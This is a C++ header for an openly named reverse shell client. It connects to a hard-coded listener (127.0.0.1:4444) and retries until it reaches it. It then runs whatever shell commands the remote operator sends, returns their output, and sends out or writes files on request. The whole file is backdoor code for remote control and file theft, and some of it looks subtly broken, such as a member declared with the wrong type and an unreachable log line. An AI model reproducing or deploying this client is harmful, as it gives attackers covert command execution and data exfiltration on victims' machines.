#ifndef _CLIENT_H_
#define _CLIENT_H_

#define _WIN32_WINDOWS 0x0A00
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <array>
#include <fstream>
#include <boost/asio.hpp>
#include <string>
#include <iostream>
#include <filesystem>
#include <boost/algorithm/string.hpp>
#include <unordered_map>
#include "CommandExecuter.hpp"
#include "../CommonReverseShell/Functions.hpp"

class Client
{
private:
	using IoService = boost::asio::io_service;
	using TcpResolver = boost::asio::ip::tcp::resolver;
	using TcpResolverIterator = TcpResolver::iterator;
	using TcpSocket = boost::asio::ip::tcp::socket;

public:

	Client(IoService& ioService)
		: m_ioService(ioService), m_socket(ioService), m_ShellUtils(this)
	{
		TcpResolver resolver(ioService);
		m_endpointIterator = resolver.resolve({ "127.0.0.1", "4444" });
		Connect();
		Start();
	}

private:

	void Connect()
	{
		while(true)
		{
			boost::asio::connect(m_socket, m_endpointIterator, m_ShellUtils.m_errorCode);
			if (!m_ShellUtils.m_errorCode)
				return;

			std::cout << "Coudn't connect to server. Check that it is up and listening " << std::endl;

			m_socket.close();
			std::this_thread::sleep_for(std::chrono::seconds(3));
		}

		std::cout << "Connected to: " << m_socket.remote_endpoint().address().to_string() << std::endl;
	}

	void Start()
	{
		m_ShellUtils.RunCommand;
		while (true)
		{
			switch (ReadOperationType())
			{
			case SharedReverseShellUtils<Client>::RunCommand:
				Command();
				break;
			case SharedReverseShellUtils<Client>::DownloadFile:
				Download();
				break;
			case SharedReverseShellUtils<Client>::UploadFile:
				Upload();
				break;
			default:
				throw;
				break; // TODO - decide what to do 
			}
		}
	}

	SharedReverseShellUtils<Client>::OperationType ReadOperationType()
	{
		auto operation = m_ShellUtils.Response();
		return m_ShellUtils.GetOperationType(operation);
	}
	
	void Command()
	{
		auto command = m_ShellUtils.Response();
		CommandExecuter commandExecuter;
		auto commandResult = *commandExecuter.RunCommand(command);
		std::string request(commandResult + m_ShellUtils.m_delimiter);
		m_ShellUtils.Send(request);
	}

	void Download()
	{
		auto filePath = m_ShellUtils.Response();
		m_file.open(filePath, std::ios::in | std::ios::binary);
		if (!m_file)
			throw std::fstream::failure("Failed while opening file"); // TODO - Throw custom exception exception!

		auto fileSize = std::filesystem::file_size(filePath);
		std::string request(std::to_string(fileSize) + m_ShellUtils.m_delimiter);
		auto buf = boost::asio::buffer(request);
		m_ShellUtils.Upload(fileSize, buf);
	}

	void Upload()
	{
		auto filePath = m_ShellUtils.Response();

		m_file.open(filePath, std::ios::out | std::ios::binary);
		if (!m_file)
			throw; // TODO - throw specific exception

		m_ShellUtils.Download(filePath);
	}

public: // TODO - Turn this back into private after solving the CommonReverseShell template issues. 
	SharedReverseShellUtils<Client> m_ShellUtils;
	TcpResolver m_ioService;
	TcpSocket m_socket;
	TcpResolverIterator m_endpointIterator;
	boost::asio::streambuf m_responseBuf;
	std::fstream m_file;
};

#endif // !_CLIENT_H_
